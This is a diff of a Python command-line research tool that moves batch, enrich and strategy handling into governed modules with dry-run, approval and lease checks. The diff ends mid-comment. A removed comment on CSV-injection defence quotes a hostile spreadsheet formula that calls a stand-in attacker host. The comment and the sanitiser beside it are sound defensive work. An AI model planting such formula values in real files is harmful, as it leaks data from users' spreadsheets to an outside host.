@@ -23,8 +23,10 @@ import argparse
 import os
 import re
 import sys
+from collections.abc import Callable
 from dataclasses import dataclass
 from enum import Enum
+from pathlib import Path
 from typing import Any, Protocol
 
 from primr.ai.genai_factory import default_genai_http_options
@@ -47,10 +49,7 @@ from primr.core.cli_batch import (
 from primr.core.cli_batch import (
     _csv_safe as _csv_safe,
 )
-from primr.core.cli_batch import (
-    _ensure_valid_url,
-    _prepare_batch_df,
-)
+from primr.core.cli_batch import _ensure_valid_url
 from primr.core.cli_batch import (
     _read_batch_file as _read_batch_file,
 )
@@ -262,6 +261,7 @@ class CLIConfig:
     qa_recent_count: int | None = None
     max_scrape_time: int | None = None
     ai_strategy_only_path: str | None = None
+    dry_run_requested: bool = False
     discovery_notes_path: str | None = None
     strategy_type: str = "ai"  # Type of strategy to generate
     framing_purpose: str | None = None  # Research framing (tradecraft Step 1)
@@ -457,11 +457,12 @@ def parse_args(args: list[str] | None = None) -> CLIConfig:
     else:
         banner_mode = banner_arg
 
-    # Batch commands default to requiring confirmation; everything else skips it.
-    # --skip-confirm explicitly skips confirmation for any command.
+    # Batch and standalone-strategy commands require one in-command approval.
+    # --skip-confirm is an explicit non-interactive approval for those paths.
     is_batch = bool(getattr(parsed, "batch", None) or parsed.csv)
+    is_standalone_strategy = bool(getattr(parsed, "ai_strategy_only", None))
     skip_confirm_flag = getattr(parsed, "skip_confirm", False)
-    skip_confirm = skip_confirm_flag if is_batch else True
+    skip_confirm = skip_confirm_flag if is_batch or is_standalone_strategy else True
 
     # Handle --platform / --cloud-vendor resolution
     raw_platforms = getattr(parsed, "platform", None)
@@ -520,6 +521,7 @@ def parse_args(args: list[str] | None = None) -> CLIConfig:
         qa_recent_count=getattr(parsed, "qa_recent", None),
         max_scrape_time=getattr(parsed, "max_scrape_time", None),
         ai_strategy_only_path=getattr(parsed, "ai_strategy_only", None),
+        dry_run_requested=getattr(parsed, "dry_run", False),
         discovery_notes_path=getattr(parsed, "discovery_notes", None),
         strategy_type=getattr(parsed, "strategy_type", "ai"),
         framing_purpose=getattr(parsed, "purpose", None),
@@ -873,7 +875,9 @@ def _create_parser() -> argparse.ArgumentParser:
         help="Enrich mode: look up websites, save CSV, don't run research",
     )
     parser.add_argument(
-        "--skip-confirm", action="store_true", help="Skip confirmation prompt for batch research"
+        "--skip-confirm",
+        action="store_true",
+        help="Explicitly approve non-interactive batch, enrich, or standalone strategy execution",
     )
 
     # Research options
@@ -1136,7 +1140,7 @@ def _create_parser() -> argparse.ArgumentParser:
         "--ai-strategy-only",
         type=str,
         metavar="REPORT_PATH",
-        help="Generate AI strategy using an existing report as context (retry failed AI strategy)",
+        help="Generate a governed strategy from an existing report; use --dry-run first",
     )
 
     # Agentic architecture commands
@@ -1249,7 +1253,6 @@ _FLAG_COMMANDS: list[tuple[str, Command]] = [
     ("resume_latest", Command.RESUME_LATEST),
     ("clear_jobs", Command.CLEAR_JOBS),
     ("list_strategies", Command.LIST_STRATEGIES),
-    ("dry_run", Command.DRY_RUN),
     ("plan", Command.PLAN),
     ("generate_vendor_research", Command.GENERATE_VENDOR),
 ]
@@ -1355,48 +1358,202 @@ def _format_vendor_research_freshness() -> str:
 def _handle_enrich(config: CLIConfig) -> int:
     """Handle batch enrich command."""
     if not config.batch_file:
-        console.error("No batch file specified")
-        console.info('Usage: primr --batch "file.xlsx" --enrich')
-        return 1
+        return _batch_handler_error(
+            config,
+            'No batch file specified. Usage: primr --batch "file.xlsx" --enrich',
+            operation="batch_enrich",
+        )
+
+    unsupported = _unsupported_enrich_option(config)
+    if unsupported:
+        return _batch_handler_error(
+            config,
+            f"{unsupported} is not supported for batch enrichment.",
+            operation="batch_enrich",
+        )
 
     return enrich_batch(
         config.batch_file,
         industry=config.industry,
         limit=config.limit,
         mode=config.mode,
+        dry_run=config.dry_run_requested,
+        json_output=config.json_output,
+        skip_confirm=config.skip_confirm,
+        budget_usd=config.budget_usd,
+        output_dir=config.output_dir,
     )
+
+
+def _resolve_batch_modes(config: CLIConfig) -> tuple[bool, bool, str] | str:
+    """Resolve the exact routing shape used by every company in a batch."""
+    if config.premium_mode and config.fast_mode:
+        return "Cannot use both --fast and --premium. Choose one."
+    use_fast_mode = config.fast_mode
+    use_premium_mode = config.premium_mode
+    full_modes = ("complete", "structured", "hybrid")
+    if not use_fast_mode and not use_premium_mode and config.mode in full_modes:
+        use_fast_mode = bool(os.environ.get("XAI_API_KEY"))
+    if use_fast_mode and config.mode not in full_modes:
+        return f"--fast only works with full mode, not --mode {config.mode}"
+    if use_premium_mode and config.mode not in full_modes:
+        return f"--premium only works with full mode, not --mode {config.mode}"
+    if use_premium_mode:
+        mode_label = "premium (Gemini + Deep Research)"
+    elif use_fast_mode:
+        from primr.core.cli_dryrun import _full_mode_label
+
+        mode_label = _full_mode_label(config.grok_tier)
+    else:
+        mode_label = config.mode
+    return (use_fast_mode, use_premium_mode, mode_label)
+
+
+def _unsupported_batch_option(config: CLIConfig) -> str | None:
+    """Return the first option whose batch semantics are not governed yet."""
+    checks = (
+        (bool(config.context_files), "--context"),
+        (bool(config.context_folder), "--context-folder"),
+        (bool(config.discovery_notes_path), "--discovery-notes"),
+        (bool(config.framing_purpose), "--purpose"),
+        (bool(config.framing_audience), "--audience"),
+        (bool(config.framing_decision), "--decision"),
+        (bool(config.framing_question), "--question"),
+        (config.resume_local, "--resume-local"),
+        (config.refresh_vendor_research, "--refresh-vendor-research"),
+        (config.open_after, "--open"),
+        (config.acknowledge_host_agent_may_bill, "--acknowledge-host-agent-may-bill"),
+    )
+    return next((option for enabled, option in checks if enabled), None)
+
+
+def _unsupported_enrich_option(config: CLIConfig) -> str | None:
+    """Return the first shared option that enrichment would otherwise ignore."""
+    checks = (
+        (bool(config.context_files), "--context"),
+        (bool(config.context_folder), "--context-folder"),
+        (bool(config.discovery_notes_path), "--discovery-notes"),
+        (bool(config.framing_purpose), "--purpose"),
+        (bool(config.framing_audience), "--audience"),
+        (bool(config.framing_decision), "--decision"),
+        (bool(config.framing_question), "--question"),
+        (config.resume_local, "--resume-local"),
+        (config.refresh_vendor_research, "--refresh-vendor-research"),
+        (config.open_after, "--open"),
+        (config.acknowledge_host_agent_may_bill, "--acknowledge-host-agent-may-bill"),
+    )
+    return next((option for enabled, option in checks if enabled), None)
+
+
+def _batch_handler_error(
+    config: CLIConfig,
+    message: str,
+    *,
+    operation: str = "batch_research",
+) -> int:
+    """Emit exactly one structured error for JSON callers, or one human error."""
+    if config.json_output:
+        from primr.core.cli_output import emit_json
+
+        emit_json(
+            {
+                "schema_version": (
+                    "primr.batch-enrich-plan.v1"
+                    if operation == "batch_enrich"
+                    else "primr.batch-plan.v1"
+                ),
+                "operation": operation,
+                "error": True,
+                "message": message,
+            }
+        )
+    else:
+        console.error(message)
+    return 1
 
 
 def _handle_batch(config: CLIConfig) -> int:
     """Handle batch processing (Excel or CSV)."""
+    batch_path = config.batch_file or config.csv_file
+    if not batch_path:
+        return _batch_handler_error(
+            config,
+            'No file specified. Usage: primr --batch "file.xlsx" --mode scrape',
+        )
+    unsupported = _unsupported_batch_option(config)
+    if unsupported:
+        return _batch_handler_error(
+            config,
+            f"{unsupported} is not supported for batch research because its cost and "
+            "per-row semantics are not yet governed.",
+        )
+    if config.json_output and not config.dry_run_requested:
+        return _batch_handler_error(
+            config,
+            "--json is supported for batch dry-run only",
+        )
     if not prepare_batch_inference_runtime(config, console):
         return 1
-    if config.batch_file:
-        return process_batch(
-            config.batch_file,
-            mode=config.mode,
-            citation_style=config.citation_style,
-            ai_strategy=config.ai_strategy,
-            platforms=config.platforms,
-            industry=config.industry,
-            limit=config.limit,
-            skip_confirm=config.skip_confirm,
+    resolved_modes = _resolve_batch_modes(config)
+    if isinstance(resolved_modes, str):
+        return _batch_handler_error(config, resolved_modes)
+    use_fast_mode, use_premium_mode, mode_label = resolved_modes
+
+    def execution_preflight() -> tuple[bool, list[str]]:
+        """Run network-bearing diagnostics only after batch approval."""
+        preflight_ok, preflight_errors = _run_preflight_checks(
+            config.mode,
+            premium_mode=use_premium_mode,
+            fast_mode=use_fast_mode,
+            allow_network=False,
         )
+        if preflight_ok:
+            os.environ["PRIMR_BROWSER_SESSION_MODE"] = config.browser_session_mode
+            if config.browser_headed:
+                os.environ["PRIMR_BROWSER_HEADED"] = "1"
+            else:
+                os.environ.pop("PRIMR_BROWSER_HEADED", None)
+        return preflight_ok, preflight_errors
 
-    # Legacy --csv path
-    if not config.csv_file:
-        console.error("No file specified")
-        console.info('Usage: primr --batch "file.xlsx" --mode scrape')
-        return 1
+    legacy_csv = bool(config.csv_file and not config.batch_file)
+    if legacy_csv and not config.json_output:
+        console.warn("--csv is deprecated; using the governed --batch workflow")
+    from primr.core.cli_budget import build_run_estimate, estimate_strategy_types
 
-    process_csv(
-        config.csv_file,
+    estimate = build_run_estimate(
+        config,
+        fast_mode=use_fast_mode,
+        premium_mode=use_premium_mode,
+    )
+    return process_batch(
+        batch_path,
         mode=config.mode,
         citation_style=config.citation_style,
         ai_strategy=config.ai_strategy,
         platforms=config.platforms,
+        industry=config.industry,
+        limit=config.limit,
+        skip_confirm=config.skip_confirm,
+        dry_run=config.dry_run_requested,
+        json_output=config.json_output,
+        per_company_estimate=estimate,
+        mode_label=mode_label,
+        output_dir=config.output_dir,
+        strategies=estimate_strategy_types(config) or None,
+        no_qa=config.no_qa,
+        max_scrape_time=config.max_scrape_time,
+        lite_strategy=config.lite_strategy,
+        fast_mode=use_fast_mode,
+        premium_mode=use_premium_mode,
+        skip_scrape_validation=config.skip_scrape_validation,
+        verify=config.verify,
+        grok_tier=config.grok_tier,
+        skip_recon=config.skip_recon,
+        continuous_reasoning=config.continuous_reasoning,
+        budget_usd=config.budget_usd,
+        execution_preflight=None if config.dry_run_requested else execution_preflight,
+        deprecated_alias="--csv" if legacy_csv else None,
     )
-    return 0
 
 
 def _handle_test_accordion(config: CLIConfig) -> int:
@@ -1623,130 +1780,15 @@ def _handle_qa_recent(config: CLIConfig) -> int:
 
 
 def _handle_ai_strategy_only(config: CLIConfig) -> int:
-    """Handle strategy generation using existing report as context."""
-    import re
-    from pathlib import Path
-
+    """Handle governed strategy generation using an existing report."""
+    from primr.core.cli_strategy import handle_ai_strategy_only
     from primr.core.research_agent import _generate_strategy_section
 
-    report_path = config.ai_strategy_only_path
-    if not report_path:
-        console.error("Report path is required for --ai-strategy-only")
-        console.info(
-            'Usage: primr --ai-strategy-only "path/to/report.md" --strategy-type customer_experience'
-        )
-        return 1
-
-    # Validate file exists and lives under a trusted root. Without root
-    # containment, an attacker who can pass --ai-strategy-only arguments
-    # (e.g. via shared automation) could upload arbitrary readable files
-    # as Deep Research context.
-    path = Path(report_path).expanduser()
-    if not path.exists():
-        console.error(f"Report file not found: {report_path}")
-        return 1
-    try:
-        from primr.config.config import OUTPUT_DIR, WORKING_DIR
-
-        allowed_roots = [Path(OUTPUT_DIR).resolve(), Path(WORKING_DIR).resolve()]
-        if config.output_dir:
-            allowed_roots.append(Path(config.output_dir).resolve())
-        resolved_path = path.resolve()
-        if not any(
-            resolved_path == root or resolved_path.is_relative_to(root) for root in allowed_roots
-        ):
-            console.error(
-                f"Report file is outside allowed roots (output/, working/): {resolved_path}"
-            )
-            return 1
-    except Exception:
-        # Defensive: if containment check itself fails, fall through to
-        # filename derivation but log it.
-        logger.warning("Could not enforce report-root containment for %s", path)
-
-    # Get strategy type (default to 'ai' if not specified)
-    strategy_type = getattr(config, "strategy_type", "ai")
-
-    # Map strategy types to display names
-    strategy_names = {
-        "ai": "AI Strategy",
-        "customer_experience": "Customer Experience Strategy",
-        "modern_security_compliance": "Security & Compliance Strategy",
-        "data_fabric_strategy": "Data Fabric Strategy",
-    }
-    strategy_display = strategy_names.get(strategy_type, strategy_type)
-
-    # Extract company name from filename or content.
-    company_name = config.company_name
-    if not company_name:
-        filename = path.stem
-        # Try to extract from filename pattern
-        match = re.match(
-            r"^(.+?)_(?:Strategic_Overview|AI_Strategy|Customer_Experience|Security|Data_Fabric)",
-            filename,
-        )
-        if match:
-            company_name = match.group(1).replace("_", " ")
-        else:
-            # Fallback: use filename without extension
-            company_name = filename.replace("_", " ")
-
-    # Always run company_name through the path-traversal-aware validator
-    # before it reaches output-path construction in _generate_strategy_section.
-    try:
-        from primr.utils.validators import (
-            InputValidationError,
-            validate_company_name,
-        )
-
-        company_name = validate_company_name(company_name)
-    except InputValidationError as e:
-        console.error(f"Invalid company name: {e.reason}")
-        return 1
-
-    console.banner(f"{strategy_display} Generation")
-    console.info(f"Company: {company_name}")
-    console.info(f"Context: {path.name}")
-    if strategy_type == "ai":
-        vendor_names = ", ".join(v.upper() for v in config.cloud_vendors)
-        console.info(f"Cloud Vendor(s): {vendor_names}")
-    console.blank()
-
-    # For AI strategy, loop over each vendor; others run once
-    vendors = list(config.cloud_vendors) if strategy_type == "ai" else ["agnostic"]
-    result_paths: list[str] = []
-    diagnostics_dir = Path(config.output_dir) / "_diagnostics" if config.output_dir else None
-
-    for vendor in vendors:
-        result_path = _generate_strategy_section(
-            strategy_name=strategy_type,
-            company_name=company_name,
-            platform=vendor,
-            company_research_path=str(path),
-            force_refresh_vendor=config.refresh_vendor_research,
-            discovery_notes_content=None,
-            lite_strategy=config.lite_strategy,
-            output_dir=config.output_dir,
-            diagnostics_dir=diagnostics_dir,
-            write_txt=config.output_dir is None,
-        )
-
-        if result_path:
-            vendor_label = (
-                f" ({vendor.upper()})" if strategy_type == "ai" and len(vendors) > 1 else ""
-            )
-            console.blank()
-            console.success_box(f"{strategy_display}{vendor_label} generated", result_path)
-            result_paths.append(result_path)
-
-    if result_paths:
-        # Open last generated file if requested
-        if config.open_after:
-            open_file(result_paths[-1])
-        return 0
-    else:
-        console.error(f"{strategy_display} generation failed")
-        return 1
+    return handle_ai_strategy_only(
+        config,
+        open_result=open_file,
+        generate_strategy=_generate_strategy_section,
+    )
 
 
 # =============================================================================
@@ -2401,7 +2443,12 @@ def _handle_eval(config: CLIConfig) -> int:
 def _handle_research(config: CLIConfig) -> int:
     """Handle research command."""
     from primr.core.research_agent import perform_research
-    from primr.core.workspace import consolidate_working_folder, validate_context_files
+    from primr.core.workspace import (
+        ActiveRunLeaseError,
+        ResumeLeaseError,
+        consolidate_working_folder,
+        validate_context_files,
+    )
     from primr.utils.validators import InputValidationError, validate_company_name, validate_url
 
     # Validate inputs
@@ -2576,6 +2623,16 @@ def _handle_research(config: CLIConfig) -> int:
             skip_recon=config.skip_recon,
             continuous_reasoning=config.continuous_reasoning,
         )
+    except ActiveRunLeaseError as exc:
+        console.error(str(exc))
+        console.info("Wait for the active run to finish, then retry.")
+        result_path = None
+    except ResumeLeaseError as exc:
+        console.error(str(exc))
+        console.info(
+            "Primr could not safely claim the workspace. Inspect the run log and lease file."
+        )
+        result_path = None
     finally:
         if budget_activation.active:
             from primr.utils.run_budget import clear_run_budget
@@ -2701,7 +2758,7 @@ def _handle_list_strategies(config: CLIConfig) -> int:
             "display_name": "AI Strategy",
             "description": "Business-first AI portfolio, economics, operating model, architecture, and governance",
             "usage": 'primr "Company" https://example.com',
-            "standalone": "Do not use until its in-command cost gate is available",
+            "standalone": 'primr --ai-strategy-only "output/report.md" --dry-run',
         }
     )
 
@@ -2725,7 +2782,10 @@ def _handle_list_strategies(config: CLIConfig) -> int:
                     "description": desc,
                     "expected_pages": expected_pages,
                     "usage": f'primr "Company" https://example.com --strategy-type {stem}',
-                    "standalone": "Do not use until its in-command cost gate is available",
+                    "standalone": (
+                        'primr --ai-strategy-only "output/report.md" '
+                        f"--strategy-type {stem} --dry-run"
+                    ),
                 }
                 if stem == "skills":
                     entry["usage"] = 'primr skills "Company" https://example.com'
@@ -2759,12 +2819,13 @@ def _handle_list_strategies(config: CLIConfig) -> int:
                 console.info(f"    {s['description']}")
             console.blank()
 
-    console.warn("Do not use standalone generation until its in-command cost gate is available.")
     console.step("How to Generate Strategies")
     console.info(
         '  1. During research:   primr "Company" https://example.com --strategy-type customer_experience'
     )
     console.info('  2. Multi-platform AI: primr "Company" https://example.com --platform aws azure')
+    console.info('  3. Existing report:    primr --ai-strategy-only "output/report.md" --dry-run')
+    console.info("     Review the standalone estimate, then approve the exact execution plan.")
     console.blank()
 
     return 0
@@ -2780,6 +2841,12 @@ def enrich_batch(
     industry: str | None = None,
     limit: int | None = None,
     mode: str = "complete",
+    *,
+    dry_run: bool = False,
+    json_output: bool = False,
+    skip_confirm: bool = False,
+    budget_usd: float | None = None,
+    output_dir: str | Path | None = None,
 ) -> int:
     """
     Enrich a batch file: detect columns, filter by industry, look up websites,
@@ -2788,128 +2855,19 @@ def enrich_batch(
     Returns:
         Exit code (0 for success)
     """
-    import os as _os
+    from primr.core.cli_batch_runtime import enrich_batch as run_governed_enrichment
 
-    from primr.data.search_utils import lookup_company_website
-
-    console.banner("Batch Enrich")
-    console.info(f"File: {file_path}")
-    if industry:
-        console.info(f"Industry filter: {industry}")
-    console.blank()
-
-    df, col_map = _prepare_batch_df(file_path, industry=industry, limit=limit)
-
-    total = len(df)
-    console.info(f"Found {total} companies")
-    console.blank()
-
-    # Build enriched rows (deduplicate by company name, case-insensitive)
-    enriched = []
-    seen_companies: set[str] = set()
-    for idx, (_, row) in enumerate(df.iterrows(), 1):
-        company_name = str(row[col_map.company]).strip()
-        if not company_name or company_name.lower() == "nan":
-            continue
-        if company_name.lower() in seen_companies:
-            logger.debug(f"Skipping duplicate company: {company_name}")
-            continue
-        seen_companies.add(company_name.lower())
-
-        # Use existing website if available, otherwise look up
-        website = None
-        if col_map.website and str(row.get(col_map.website, "")).strip().lower() not in ("", "nan"):
-            website = str(row[col_map.website]).strip()
-        else:
-            console.info(f"  [{idx}/{total}] Looking up {company_name}...")
-            # Pass only LLM-selected context columns
-            row_context = {
-                k: str(row[k]).strip()
-                for k in col_map.context
-                if str(row.get(k, "")).strip().lower() not in ("", "nan")
-            }
-            website = lookup_company_website(company_name, context=row_context)
-
-        ind_value = ""
-        if col_map.industry and str(row.get(col_map.industry, "")).strip().lower() != "nan":
-            ind_value = str(row[col_map.industry]).strip()
-
-        enriched.append(
-            {
-                "company_name": company_name,
-                "website": website or "",
-                "industry": ind_value,
-            }
-        )
-
-    # Display table
-    console.blank()
-    console.info(f"  {'#':>3}  {'Company':<35} {'Website':<35} {'Industry'}")
-    console.info(f"  {'---':>3}  {'-' * 35} {'-' * 35} {'-' * 20}")
-    for i, row in enumerate(enriched, 1):
-        w = row["website"][:33] + ".." if len(row["website"]) > 35 else row["website"]
-        c = (
-            row["company_name"][:33] + ".."
-            if len(row["company_name"]) > 35
-            else row["company_name"]
-        )
-        console.info(f"  {i:>3}  {c:<35} {w:<35} {row['industry']}")
-
-    found = sum(1 for r in enriched if r["website"])
-    missing = len(enriched) - found
-    console.blank()
-    console.info(f"Websites found: {found}/{len(enriched)}")
-    if missing:
-        console.warn(f"Missing websites: {missing} (edit the CSV to add them manually)")
-
-    # Save enriched CSV. Sanitize formula-leading cells before export so
-    # Excel/Sheets/LibreOffice won't evaluate hostile content (e.g. a
-    # company_name like `=WEBSERVICE("https://attacker/")` injected via
-    # the input spreadsheet). Prefixing with a single quote is the
-    # standard CSV-injection mitigation: spreadsheet apps render the
-    # value as a string instead of a formula. See OWASP "CSV Injection".
-    import pandas as pd
-
-    _DANGEROUS_LEAD_CHARS = ("=", "+", "-", "@", "\t", "\r")
-
-    def _csv_safe(value: object) -> object:
-        if isinstance(value, str) and value and value[0] in _DANGEROUS_LEAD_CHARS:
-            return "'" + value
-        return value
-
-    safe_rows = [{k: _csv_safe(v) for k, v in row.items()} for row in enriched]
-
-    base = _os.path.splitext(_os.path.basename(file_path))[0]
-    suffix = f"_{industry.lower().replace(' ', '_')}" if industry else ""
-    out_name = f"{base}{suffix}_enriched.csv"
-    out_path = _os.path.join(".", out_name)
-
-    pd.DataFrame(safe_rows).to_csv(out_path, index=False, encoding="utf-8")
-    console.blank()
-    console.ok(f"Saved: {out_path}")
-
-    # Cost estimates (from cost_estimator)
-    from primr.utils.cost_estimator import estimate_cost
-
-    count = len(enriched)
-    scrape_est = estimate_cost("scrape-only", use_historical=False)
-    deep_est = estimate_cost("deep-research", use_historical=False)
-    full_est = estimate_cost("complete", use_historical=False)
-    console.blank()
-    console.info("Cost estimates:")
-    console.info(
-        f"  scrape mode: {count} x ${scrape_est.total_cost:.2f} = ~${count * scrape_est.total_cost:.2f}"
+    return run_governed_enrichment(
+        file_path,
+        industry=industry,
+        limit=limit,
+        mode=mode,
+        dry_run=dry_run,
+        json_output=json_output,
+        skip_confirm=skip_confirm,
+        budget_usd=budget_usd,
+        output_dir=output_dir,
     )
-    console.info(
-        f"  deep mode:   {count} x ${deep_est.total_cost:.2f} = ~${count * deep_est.total_cost:.2f}"
-    )
-    console.info(
-        f"  full mode:   {count} x ${full_est.total_cost:.2f} = ~${count * full_est.total_cost:.2f}"
-    )
-    console.blank()
-    console.info(f'Next step: primr --batch "{out_path}" --mode scrape')
-
-    return 0
 
 
 def process_batch(
@@ -2921,392 +2879,70 @@ def process_batch(
     industry: str | None = None,
     limit: int | None = None,
     skip_confirm: bool = True,
+    *,
+    dry_run: bool = False,
+    json_output: bool = False,
+    per_company_estimate=None,
+    mode_label: str | None = None,
+    output_dir: str | Path | None = None,
+    strategies: list[str] | None = None,
+    no_qa: bool = False,
+    max_scrape_time: int | None = None,
+    lite_strategy: bool = False,
+    fast_mode: bool = False,
+    premium_mode: bool = False,
+    skip_scrape_validation: bool = False,
+    verify: bool = False,
+    grok_tier: str = "hybrid",
+    skip_recon: bool = False,
+    continuous_reasoning: bool = True,
+    budget_usd: float | None = None,
+    execution_preflight: Callable[[], tuple[bool, list[str]]] | None = None,
+    deprecated_alias: str | None = None,
 ) -> int:
     """
     Process a batch file (Excel or CSV) for research.
 
-    Handles smart column detection, optional industry filtering,
-    auto website lookup, and sequential research execution.
+    Handles deterministic column detection, optional industry filtering,
+    validation, a single batch approval, and sequential research execution.
+    Rows without websites must be enriched before research.
 
     Returns:
         Exit code (0 for success)
     """
+    from primr.core.cli_batch_runtime import process_batch as run_governed_batch
     from primr.core.research_agent import perform_research
-    from primr.data.search_utils import lookup_company_website
 
-    console.banner("Batch Research")
-    console.info(f"File: {file_path}")
-    console.info(f"Mode: {mode}")
-    if industry:
-        console.info(f"Industry filter: {industry}")
-    console.blank()
-
-    df, col_map = _prepare_batch_df(file_path, industry=industry, limit=limit)
-
-    # Build company list with row context for disambiguation (deduplicate by name)
-    companies: list[tuple[str, str | None, dict]] = []
-    seen_companies: set[str] = set()
-    for _, row in df.iterrows():
-        company_name = str(row[col_map.company]).strip()
-        if not company_name or company_name.lower() == "nan":
-            continue
-        if company_name.lower() in seen_companies:
-            logger.debug(f"Skipping duplicate company: {company_name}")
-            continue
-        seen_companies.add(company_name.lower())
-
-        website = None
-        if col_map.website and str(row.get(col_map.website, "")).strip().lower() not in ("", "nan"):
-            website = str(row[col_map.website]).strip()
-
-        row_context = {
-            k: str(row[k]).strip()
-            for k in col_map.context
-            if str(row.get(k, "")).strip().lower() not in ("", "nan")
-        }
-        companies.append((company_name, website, row_context))
-
-    if not companies:
-        console.error("No companies found in file")
-        return 1
-
-    total = len(companies)
-
-    # Show preview
-    console.info(f"Companies to research: {total}")
-    for i, (name, url, _ctx) in enumerate(companies[:10], 1):
-        console.info(f"  {i}. {name} - {url or '(website TBD)'}")
-    if total > 10:
-        console.info(f"  ... and {total - 10} more")
-
-    # Cost estimate
-    mode_costs = {"scrape-only": 0.10, "deep-research": 1.00, "complete": 1.50, "hybrid": 1.50}
-    per_cost = mode_costs.get(mode, 1.50)
-    console.blank()
-    console.info(f"Estimated cost: {total} x ${per_cost:.2f} = ~${total * per_cost:.2f}")
-
-    # Confirmation
-    if not skip_confirm:
-        console.blank()
-        response = input("Proceed? [y/N] ").strip().lower()
-        if response not in ("y", "yes"):
-            console.info("Cancelled.")
-            return 0
-
-    # Defensive thresholds
-    max_consecutive_failures = 3
-    min_report_size_kb = 5  # Reports under 5KB are suspiciously small
-    max_retries_per_company = 2
-    retry_wait_minutes = [0, 2, 5]  # Progressive backoff: immediate, 2min, 5min
-    billing_wait_minutes = 10  # How long to pause when billing/credits exhausted
-
-    # Check for existing reports (enables resume)
-    import glob
-    import time as _time
-    from datetime import datetime
-
-    from primr.config.config import OUTPUT_DIR
-
-    today_str = datetime.now().strftime("%m-%d-%Y")
-
-    def _find_existing_report(company: str) -> str | None:
-        """Check if a report already exists for this company (today)."""
-        # Try both raw name and underscore-sanitized name for broader matching
-        candidates = {company, company.replace(" ", "_").replace("/", "_")}
-        for name in candidates:
-            # glob.escape the company-name fragment so glob metacharacters in
-            # the name (e.g. brackets in "Acme [Holdings]", "?", "*") are
-            # matched literally - without this, resume silently misses the
-            # existing report and re-runs the (paid) research.
-            pattern = os.path.join(OUTPUT_DIR, f"{glob.escape(name)}*Overview*{today_str}*")
-            matches = glob.glob(pattern)
-            if matches:
-                # Prefer .docx > .md > .txt > anything else
-                for ext in (".docx", ".md", ".txt"):
-                    for m in matches:
-                        if m.endswith(ext):
-                            return m
-                return matches[0]
-        return None
-
-    # Run research sequentially with defensive checks
-    console.blank()
-    results: list[dict] = []  # {company, status, path, size_kb, error}
-    consecutive_failures = 0
-    skipped_existing = 0
-
-    for i, (company_name, website, row_ctx) in enumerate(companies, 1):
-        # Resume: skip companies that already have reports from today
-        existing = _find_existing_report(company_name)
-        if existing:
-            size_kb = os.path.getsize(existing) / 1024
-            console.info(f"[{i}/{total}] {company_name} - already done ({size_kb:.0f}KB), skipping")
-            results.append(
-                {
-                    "company": company_name,
-                    "status": "ok",
-                    "path": existing,
-                    "size_kb": size_kb,
-                    "error": None,
-                }
-            )
-            skipped_existing += 1
-            continue
-
-        console.step(f"[{i}/{total}] Researching {company_name}...")
-
-        # Look up website if missing
-        if not website:
-            console.info(f"  Looking up website for {company_name}...")
-            website = lookup_company_website(company_name, context=row_ctx)
-            if not website:
-                console.warn(f"  No website found for {company_name}, skipping")
-                results.append(
-                    {
-                        "company": company_name,
-                        "status": "skipped",
-                        "path": None,
-                        "size_kb": 0,
-                        "error": "no website found",
-                    }
-                )
-                consecutive_failures += 1
-                if consecutive_failures >= max_consecutive_failures:
-                    console.error(f"  {max_consecutive_failures} consecutive failures - pausing")
-                    resp = input("  Continue? [y/N] ").strip().lower()
-                    if resp not in ("y", "yes"):
-                        console.info("  Batch stopped by user.")
-                        break
-                    consecutive_failures = 0
-                continue
-
-        # Research with retry and progressive backoff
-        results_len_before = len(results)
-        for attempt in range(max_retries_per_company + 1):
-            # Progressive backoff: wait before retries (not before first attempt)
-            wait_min = retry_wait_minutes[attempt] if attempt < len(retry_wait_minutes) else 5
-            if attempt > 0 and wait_min > 0:
-                console.warn(
-                    f"  Retrying in {wait_min}min "
-                    f"(attempt {attempt + 1}/{max_retries_per_company + 1})..."
-                )
-                _time.sleep(wait_min * 60)
-
-            try:
-                result_path = perform_research(
-                    company_name,
-                    _ensure_valid_url(website),
-                    mode=mode,
-                    citation_style=citation_style,
-                    ai_strategy=ai_strategy,
-                    platforms=platforms,
-                )
-
-                if result_path:
-                    size_kb = (
-                        os.path.getsize(result_path) / 1024 if os.path.exists(result_path) else 0
-                    )
-                    if size_kb < min_report_size_kb:
-                        console.warn(f"  Report is only {size_kb:.1f}KB - may be incomplete")
-                        results.append(
-                            {
-                                "company": company_name,
-                                "status": "warning",
-                                "path": result_path,
-                                "size_kb": size_kb,
-                                "error": "small report",
-                            }
-                        )
-                    else:
-                        console.ok(f"  Done - {size_kb:.0f}KB")
-                        results.append(
-                            {
-                                "company": company_name,
-                                "status": "ok",
-                                "path": result_path,
-                                "size_kb": size_kb,
-                                "error": None,
-                            }
-                        )
-                    consecutive_failures = 0
-                    break
-                else:
-                    # No report returned - not transient, don't retry
-                    console.error(f"  No report generated for {company_name}")
-                    results.append(
-                        {
-                            "company": company_name,
-                            "status": "failed",
-                            "path": None,
-                            "size_kb": 0,
-                            "error": "no report returned",
-                        }
-                    )
-                    consecutive_failures += 1
-                    break
-
-            except Exception as e:
-                error_str = str(e).lower()
-
-                # Billing exhaustion - pause immediately, don't burn retries
-                is_billing = any(
-                    s in error_str
-                    for s in (
-                        "credits exhausted",
-                        "spending limit",
-                        "available credits",
-                        "insufficient credits",
-                    )
-                )
-                if is_billing:
-                    console.error("  xAI credits exhausted - add credits at https://console.x.ai/")
-                    if skip_confirm:
-                        console.info(f"  Pausing {billing_wait_minutes}min then retrying...")
-                        _time.sleep(billing_wait_minutes * 60)
-                        continue  # Retry same company
-                    console.info(f"  [w] Wait {billing_wait_minutes} minutes and retry")
-                    console.info("  [s] Stop batch (re-run to resume)")
-                    resp = input("  Choice [w/s]: ").strip().lower()
-                    if resp == "w":
-                        console.info(f"  Waiting {billing_wait_minutes}min...")
-                        _time.sleep(billing_wait_minutes * 60)
-                        continue  # Retry same company
-                    else:
-                        console.info("  Batch stopped. Re-run the same command to resume.")
-                        results.append(
-                            {
-                                "company": company_name,
-                                "status": "failed",
-                                "path": None,
-                                "size_kb": 0,
-                                "error": "billing exhausted - stopped by user",
-                            }
-                        )
-                        break
-
-                is_quota = any(
-                    s in error_str for s in ("quota", "rate", "429", "resource_exhausted")
-                )
-
-                if is_quota and attempt < max_retries_per_company:
-                    continue  # Will wait at top of next iteration
-
-                console.error(f"  Failed: {company_name} - {e}")
-                results.append(
-                    {
-                        "company": company_name,
-                        "status": "failed",
-                        "path": None,
-                        "size_kb": 0,
-                        "error": str(e)[:80],
-                    }
-                )
-                consecutive_failures += 1
-                break
-
-        # If the retry loop exited without recording any terminal result for
-        # this company - e.g. skip_confirm billing exhaustion kept `continue`-ing
